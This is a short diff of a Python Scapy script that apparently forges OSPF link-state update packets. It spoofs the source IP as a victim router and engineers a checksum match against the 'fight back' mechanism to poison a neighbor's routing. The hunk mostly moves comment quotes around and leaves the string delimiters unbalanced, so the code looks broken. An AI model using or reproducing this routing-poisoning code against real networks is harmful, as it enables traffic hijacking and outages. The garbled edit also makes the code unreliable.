@@ -220,7 +220,8 @@ if __name__ == '__main__':
 	"""
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
-
+	"""
+	this part of the code is under implementation
 	"""
 	ORIGINAL SOLUTION:
 	Get the value to modify the dummy link in order to have the same checksum as the fight back
@@ -240,10 +241,10 @@ if __name__ == '__main__':
 
 	print("[+] sending the pkts...")
 	
-	"""
+
 	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
 	"""
-
+		
 	pkt_evil[IP].src = victim_ip
 	pkt_evil[IP].dst = neighbor_ip
 	pkt_evil[IP].chksum = None
